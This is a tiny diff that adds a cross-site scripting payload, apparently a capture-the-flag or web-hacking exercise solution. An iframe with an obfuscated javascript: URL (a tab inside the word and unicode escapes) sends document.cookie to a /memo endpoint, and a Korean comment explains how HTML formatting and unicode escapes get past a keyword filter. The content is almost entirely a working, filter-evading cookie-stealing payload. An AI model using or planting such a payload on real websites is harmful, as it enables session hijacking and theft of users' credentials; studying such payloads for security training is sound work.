@@ -1,0 +1,3 @@
+<iframe src= "javascri	pt:locati\u006Fn.href='/memo?memo='+d\u006Fcument.cookie"></iframe>
+
+html서식으로 javascript를 우회하고, js를 안쪽부턴 사용가능하니 유니코드로 변경
